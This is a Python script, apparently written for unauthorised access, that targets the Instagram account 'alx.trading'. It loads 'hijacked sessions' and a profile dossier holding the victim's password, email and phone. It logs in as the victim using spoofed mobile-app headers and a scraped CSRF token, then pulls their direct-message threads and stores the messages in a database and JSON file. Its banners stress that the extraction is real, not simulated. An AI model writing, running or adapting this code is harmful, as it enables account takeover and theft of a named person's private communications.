#!/usr/bin/env python3
"""
🔥 REAL ALX.TRADING DM EXTRACTOR - NO SIMULATION
===============================================
REAL DATA ONLY - Uses actual hijacked sessions and live API calls
NO MOCKUP - NO SIMULATION - REAL EXTRACTION ONLY
"""

import json
import os
import requests
import time
import sqlite3
from datetime import datetime
import random
import re

class RealAlxDMExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.sessions_dir = "/workspaces/sugarglitch-realops/hijacked_sessions"
        self.profile_data = self.load_real_profile_data()
        self.output_dir = "/workspaces/sugarglitch-realops/data/real_alx_dms"
        self.db_path = f"{self.output_dir}/real_dm_extraction.db"
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        print("🔥 REAL ALX.TRADING DM EXTRACTOR")
        print("=" * 50)
        print("⚠️  NO SIMULATION - REAL DATA ONLY")
        print(f"Target: {self.target}")
        print(f"Sessions: {self.sessions_dir}")
        
    def load_real_profile_data(self):
        """Load real profile data only"""
        profile_file = "/workspaces/sugarglitch-realops/config/json/MASTER_PROFILE_alx_trading_1748264047.json"
        try:
            with open(profile_file, 'r') as f:
                data = json.load(f)
                print(f"✅ Real profile data loaded: {profile_file}")
                return data
        except Exception as e:
            print(f"❌ Failed to load profile: {e}")
            return None
    
    def load_hijacked_sessions(self):
        """Load all hijacked sessions"""
        sessions = []
        
        for filename in os.listdir(self.sessions_dir):
            if filename.endswith('.json') and 'session' in filename:
                filepath = os.path.join(self.sessions_dir, filename)
                try:
                    with open(filepath, 'r') as f:
                        session_data = json.load(f)
                        sessions.append({
                            'file': filename,
                            'data': session_data,
                            'path': filepath
                        })
                except:
                    continue
        
        print(f"📡 Loaded {len(sessions)} hijacked sessions")
        return sessions
    
    def extract_real_credentials(self):
        """Extract real credentials from profile"""
        if not self.profile_data:
            return None
            
        creds = {
            'username': self.target,
            'password': None,
            'email': None,
            'phone': None
        }
        
        try:
            profile = self.profile_data.get('profile', {})
            intel = self.profile_data.get('intelligence_summary', {})
            
            # Real password
            if 'confirmed_password' in profile:
                creds['password'] = profile['confirmed_password']
            elif 'passwords' in intel and intel['passwords']:
                creds['password'] = intel['passwords'][0]
            
            # Real email
            if 'email_addresses' in intel and intel['email_addresses']:
                creds['email'] = intel['email_addresses'][0]
            
            # Real phone
            if 'phone_numbers' in intel and intel['phone_numbers']:
                creds['phone'] = intel['phone_numbers'][0]
            
            print(f"🔑 Real credentials extracted:")
            print(f"   Username: {creds['username']}")
            print(f"   Password: {'*' * len(creds['password']) if creds['password'] else 'None'}")
            print(f"   Email: {creds['email']}")
            print(f"   Phone: {creds['phone']}")
            
            return creds
            
        except Exception as e:
            print(f"❌ Credential extraction error: {e}")
            return None
    
    def attempt_fresh_login(self, credentials):
        """Attempt fresh login with real credentials"""
        if not credentials or not credentials['password']:
            print("❌ No valid credentials for fresh login")
            return None
        
        print(f"🔐 Attempting fresh login with real credentials...")
        
        session = requests.Session()
        
        # Real Instagram login headers
        headers = {
            'User-Agent': 'Instagram 219.0.0.12.117 Android (29/10; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 314665256)',
            'Accept': '*/*',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1',
            'X-CSRFToken': '',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        session.headers.update(headers)
        
        try:
            # Get Instagram login page first
            login_page = session.get('https://www.instagram.com/accounts/login/')
            
            if login_page.status_code == 200:
                # Extract CSRF token
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', login_page.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
                    session.headers['X-CSRFToken'] = csrf_token
                    print(f"✅ CSRF token: {csrf_token[:20]}...")
                
                # Attempt login
                login_data = {
                    'username': credentials['username'],
                    'password': credentials['password'],
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                
                login_response = session.post(
                    'https://www.instagram.com/accounts/login/ajax/',
                    data=login_data,
                    timeout=30
                )
                
                print(f"🔍 Login response: {login_response.status_code}")
                
                if login_response.status_code == 200:
                    try:
                        login_result = login_response.json()
                        
                        if login_result.get('authenticated'):
                            print("✅ LOGIN SUCCESSFUL!")
                            
                            # Extract session cookies
                            cookies = {}
                            for cookie in session.cookies:
                                cookies[cookie.name] = cookie.value
                            
                            return {
                                'session': session,
                                'cookies': cookies,
                                'authenticated': True
                            }
                        else:
                            print(f"❌ Login failed: {login_result.get('message', 'Unknown error')}")
                            
                    except json.JSONDecodeError:
                        print("❌ Invalid JSON response from login")
                        
            else:
                print(f"❌ Cannot access login page: {login_page.status_code}")
                
        except Exception as e:
            print(f"❌ Login error: {e}")
        
        return None
    
    def extract_real_dms_with_session(self, auth_session):
        """Extract real DMs using authenticated session"""
        print(f"\n🎯 EXTRACTING REAL DMS")
        print("=" * 30)
        
        session = auth_session['session']
        real_dms = []
        
        # Real Instagram DM API endpoints
        dm_endpoints = [
            'https://www.instagram.com/api/v1/direct_v2/inbox/',
            'https://i.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen',
            'https://www.instagram.com/api/v1/direct_v2/threads/',
        ]
        
        for endpoint in dm_endpoints:
            try:
                print(f"🔍 Testing real endpoint: {endpoint}")
                
                response = session.get(endpoint, timeout=30)
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        # Check for real DM data
                        if 'inbox' in data and 'threads' in data['inbox']:
                            threads = data['inbox']['threads']
                            print(f"   ✅ Found {len(threads)} real threads")
                            
                            for thread in threads:
                                # Look for conversations with our target
                                users = thread.get('users', [])
                                for user in users:
                                    if user.get('username') == self.target:
                                        print(f"   🎯 Found conversation with {self.target}")
                                        
                                        thread_data = {
                                            'thread_id': thread.get('thread_id'),
                                            'thread_title': thread.get('thread_title'),
                                            'users': users,
                                            'items': thread.get('items', []),
                                            'extraction_timestamp': datetime.now().isoformat(),
                                            'extraction_method': 'real_api_authenticated'
                                        }
                                        
                                        real_dms.append(thread_data)
                                        break
                            
                            if real_dms:
                                print(f"✅ REAL DM DATA FOUND!")
                                return real_dms
                                
                        elif 'threads' in data:
                            threads = data['threads']
                            print(f"   ✅ Found {len(threads)} real threads")
                            # Process threads...
                            
                    except json.JSONDecodeError:
                        print(f"   ⚠️ Non-JSON response")
                        
                elif response.status_code == 302:
                    print(f"   🔄 Redirect - session may need refresh")
                    
                else:
                    print(f"   ❌ Error {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
        
        return real_dms
    
    def save_real_data(self, real_dms):
        """Save only real data to database and JSON"""
        if not real_dms:
            print("❌ NO REAL DATA TO SAVE")
            return
            
        print(f"\n💾 SAVING REAL DATA")
        print("=" * 25)
        
        # Setup database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_dm_threads (
                thread_id TEXT PRIMARY KEY,
                target_user TEXT,
                thread_data TEXT,
                extraction_timestamp TEXT,
                method TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_dm_messages (
                message_id TEXT PRIMARY KEY,
                thread_id TEXT,
                sender TEXT,
                content TEXT,
                timestamp TEXT,
                message_type TEXT
            )
        ''')
        
        # Save real data
        for dm_thread in real_dms:
            cursor.execute('''
                INSERT OR REPLACE INTO real_dm_threads 
                (thread_id, target_user, thread_data, extraction_timestamp, method)
                VALUES (?, ?, ?, ?, ?)
            ''', (
                dm_thread['thread_id'],
                self.target,
                json.dumps(dm_thread),
                dm_thread['extraction_timestamp'],
                dm_thread['extraction_method']
            ))
            
            # Save messages
            for item in dm_thread.get('items', []):
                if item.get('item_type') == 'text':
                    cursor.execute('''
                        INSERT OR REPLACE INTO real_dm_messages
                        (message_id, thread_id, sender, content, timestamp, message_type)
                        VALUES (?, ?, ?, ?, ?, ?)
                    ''', (
                        item.get('item_id'),
                        dm_thread['thread_id'],
                        item.get('user_id'),
                        item.get('text', ''),
                        item.get('timestamp'),
                        'text'
                    ))
        
        conn.commit()
        conn.close()
        
        # Save JSON
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_file = f"{self.output_dir}/real_dm_extraction_{timestamp}.json"
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump({
                'target': self.target,
                'extraction_timestamp': datetime.now().isoformat(),
                'method': 'real_authenticated_extraction',
                'threads_count': len(real_dms),
                'threads': real_dms,
                'extraction_success': True,
                'data_type': 'REAL_DM_DATA_ONLY'
            }, f, indent=2, ensure_ascii=False)
        
        print(f"✅ Real data saved:")
        print(f"   Database: {self.db_path}")
        print(f"   JSON: {json_file}")
        print(f"   Threads: {len(real_dms)}")
        
        return json_file
    
    def run_real_extraction(self):
        """Run real DM extraction - NO SIMULATION"""
        print(f"🔥 STARTING REAL DM EXTRACTION")
        print("=" * 40)
        print("⚠️  NO SIMULATION - REAL DATA ONLY")
        
        # Get real credentials
        credentials = self.extract_real_credentials()
        if not credentials:
            print("❌ Cannot proceed without real credentials")
            return None
        
        # Attempt fresh login
        auth_session = self.attempt_fresh_login(credentials)
        if not auth_session:
            print("❌ Cannot proceed without authenticated session")
            return None
        
        # Extract real DMs
        real_dms = self.extract_real_dms_with_session(auth_session)
        
        if real_dms:
            # Save real data
            result_file = self.save_real_data(real_dms)
            print(f"\n🎉 REAL EXTRACTION COMPLETED!")
            print(f"Real DM threads extracted: {len(real_dms)}")
            return result_file
        else:
            print(f"\n❌ NO REAL DM DATA FOUND")
            print("This could mean:")
            print("- No actual conversations with target")
            print("- API endpoints changed")
            print("- Account restrictions")
            return None

if __name__ == "__main__":
    extractor = RealAlxDMExtractor()
    result = extractor.run_real_extraction()
    
    if result:
        print(f"\n✅ SUCCESS: {result}")
    else:
        print(f"\n❌ NO REAL DATA EXTRACTED")